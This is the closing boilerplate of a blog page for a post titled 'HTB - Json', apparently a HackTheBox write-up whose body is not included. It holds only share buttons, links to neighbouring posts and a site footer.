<a class="resp-sharing-button__link" href="mailto:?subject=HTB%20-%20Json&amp;body=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f&amp;media=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f;description=HTB%20-%20Json" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f&amp;title=HTB%20-%20Json&amp;summary=HTB%20-%20Json&amp;source=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f&amp;resubmit=true&amp;title=HTB%20-%20Json" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f;title=HTB%20-%20Json" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%20-%20Json%20https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f&amp;t=HTB%20-%20Json" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%20-%20Json&amp;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>
          <hr />

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h"></span>
        </div>

        <div class="pagination__buttons">
          
            <a href="https://0xade1.github.io/devdraft/posts/2020/02/htb-re/" class="button previous">
                <span class="button__icon">←</span>
                <span class="button__text">HTB - Re</span>
            </a>
          

          
            <a href="https://0xade1.github.io/devdraft/posts/2020/04/htb-popcorm/" class="button next">
                <span class="button__text">HTB - Popcorm</span>
                <span class="button__icon">→</span>
            </a>
          
        </div>
      </div>
    

      <hr />

        










  </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            
            <span><a href="https://0xade1.github.io/devdraft/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084;</span>
          </div>
    </div>
</footer>

            
        </div>

        



<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js" integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5&#43;q9hMmUsWWGa7&#43;YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE&#43;kyEg=="></script>



    </body>
</html>
